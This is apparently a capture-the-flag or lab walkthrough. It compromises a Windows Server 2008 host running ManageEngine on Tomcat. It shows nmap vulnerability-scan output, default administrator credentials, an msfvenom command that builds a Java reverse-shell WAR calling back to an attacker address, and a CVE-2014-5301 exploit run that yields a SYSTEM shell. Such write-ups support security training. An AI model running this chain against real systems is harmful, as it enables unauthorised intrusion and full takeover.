```
nmap -A -sV -Pn --script vuln 192.168.247.43
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 13:14 CDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.247.43
Host is up (0.042s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.247.43
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.247.43:8080/
|     Form id: message
|     Form action: j_security_check;jsessionid=5EB1DDF99CFD95CFA45CE7265667DC64
|     
|     Path: http://192.168.247.43:8080/j_security_check;jsessionid=5EB1DDF99CFD95CFA45CE7265667DC64
|     Form id: message
|_    Form action: j_security_check;jsessionid=5EB1DDF99CFD95CFA45CE7265667DC64
|_http-server-header: Apache-Coyote/1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 571.20 seconds

```

Found two sets of valid credentials based on ManageEngine documentation.

guest:guest
administrator:administrator

https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

```
msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.216 LPORT=4444 -f war > shell.war
Payload size: 13322 bytes
Final size of war file: 13322 bytes

                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2014-5301.py 192.168.247.43 8080 administrator administrator shell.war       
<Element 'web-app' at 0x7fc14521e340>
Trying http://192.168.247.43:8080/NK0oWlGV5z2aTgoCcsDwQYmOHuE2mIO4/xegphwgthhl/vze8L3ZCcaWNyQdW
Trying http://192.168.247.43:8080/NK0oWlGV5z2aTgoCcsDwQYmOHuE2mIO4/xegphwgthhl/nzRrruGDXZWp5Uv4

```

Got a reverse shell and was running as system.